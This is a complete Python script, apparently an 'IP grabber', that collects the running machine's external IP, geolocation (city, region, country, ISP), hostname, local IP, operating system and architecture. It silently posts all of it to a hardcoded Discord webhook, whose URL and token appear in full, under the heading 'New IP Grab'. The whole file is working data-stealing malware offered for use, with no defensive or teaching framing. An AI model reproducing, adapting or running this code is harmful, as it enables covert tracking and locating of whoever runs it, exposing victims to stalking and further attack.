import requests
import platform
import socket
import json
from concurrent.futures import ThreadPoolExecutor

WEBHOOK_URL = "https://discord.com/api/webhooks/1537528221724319887/wRdtu2bbiedU3IvAmhke1R8mPpkoZ1JARV1lBveEYRrE_JUSh3CndxEASJLTzb6_HAN-"

EXTERNAL_IP_SERVICES = [
    "https://api.ipify.org",
    "https://icanhazip.com",
    "https://ipecho.net/plain",
    "https://checkip.amazonaws.com"
]

LOCATION_SERVICES = [
    "http://ip-api.com/json/",
    "https://ipinfo.io/json",
    "https://freegeoip.app/json/"
]

def check_external_ip(service_url):
    try:
        response = requests.get(service_url, timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return None

def get_external_ip():
    with ThreadPoolExecutor() as executor:
        results = list(executor.map(check_external_ip, EXTERNAL_IP_SERVICES))
    return next((ip for ip in results if ip), "Unknown")

def get_location_info(ip):
    for service in LOCATION_SERVICES:
        try:
            url = f"{service}{ip}"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    'city': data.get('city', 'N/A'),
                    'region': data.get('regionName', 'N/A'),
                    'country': data.get('country', 'N/A'),
                    'isp': data.get('org', 'N/A')
                }
        except:
            continue
    return {'city': 'N/A', 'region': 'N/A', 'country': 'N/A', 'isp': 'N/A'}

def get_system_info():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return {
        'hostname': hostname,
        'local_ip': local_ip,
        'os': platform.system(),
        'architecture': platform.machine()
    }

def send_to_discord(data):
    embed = {
        "title": "New IP Grab",
        "color": 0x00ff00,
        "fields": [
            {"name": "External IP", "value": data['external_ip']},
            {"name": "City", "value": data['location']['city']},
            {"name": "Region", "value": data['location']['region']},
            {"name": "Country", "value": data['location']['country']},
            {"name": "ISP", "value": data['location']['isp']},
            {"name": "Local IP", "value": data['system']['local_ip']},
            {"name": "Hostname", "value": data['system']['hostname']},
            {"name": "OS", "value": data['system']['os']},
            {"name": "Architecture", "value": data['system']['architecture']}
        ]
    }
    
    payload = {"embeds": [embed]}
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except Exception as e:
        print(f"Error sending to Discord: {e}")

def main():
    external_ip = get_external_ip()
    location = get_location_info(external_ip)
    system = get_system_info()
    
    data = {
        'external_ip': external_ip,
        'location': location,
        'system': system
    }
    
    send_to_discord(data)
    print(f"Collected IP: {external_ip}")

if __name__ == "__main__":
    main()